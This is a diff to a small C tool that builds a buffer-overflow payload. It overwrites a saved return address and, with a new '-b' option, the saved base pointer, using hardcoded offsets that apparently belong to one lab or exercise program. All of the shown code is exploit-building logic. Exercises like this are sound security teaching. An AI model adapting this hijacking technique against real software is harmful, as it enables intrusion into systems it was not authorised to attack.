@@ -70,9 +70,18 @@ static inline int parse_hex32(uint32_t *result, const char *arg) {
 }
 
 int main(int argc, char **argv) {
+	int do_ebp = 0;
 	int correct_password = 0;
-	for(int opt; (opt = getopt(argc, argv, "v")) != -1;) {
+	uint32_t ebp = 0;
+	for(int opt; (opt = getopt(argc, argv, "b:v")) != -1;) {
 		switch(opt) {
+		case 'b':
+			if(parse_hex32(&ebp, optarg) < 0) {
+				fprintf(stderr, "cannot parse %s: %s\n", optarg, strerror(errno));
+				goto usage;
+			}
+			do_ebp = 1;
+			break;
 		case 'v':
 			correct_password = 1;
 			break;
@@ -89,7 +98,7 @@ int main(int argc, char **argv) {
 	if(parse_hex32(&jump_addr, argv[optind]) < 0) {
 		fprintf(stderr, "cannot parse %s: %s\n", argv[optind], strerror(errno));
 	usage:
-		fprintf(stderr, "Usage: %s [-v] HEX_ADDRESS\n", argv[0]);
+		fprintf(stderr, "Usage: %s [-b EBP] [-v] HEX_ADDRESS\n", argv[0]);
 		return 2;
 	}
 	++optind;
@@ -125,6 +134,10 @@ int main(int argc, char **argv) {
 	// output.
 	uint32_t *const ret = (uint32_t *)(buf + (ADDR_RETURN_ADDRESS - ADDR_PASSWORD));
 	*ret = htole32(jump_addr);
+	if(do_ebp) {
+		uint32_t *const ebp_ptr = (uint32_t *)(buf + (ADDR_BASE_POINTER - ADDR_PASSWORD));
+		*ebp_ptr = htole32(ebp);
+	}
 
 	for(char *c = buf; c < buf + size; ++c) {
 		if(isspace(*c)) {
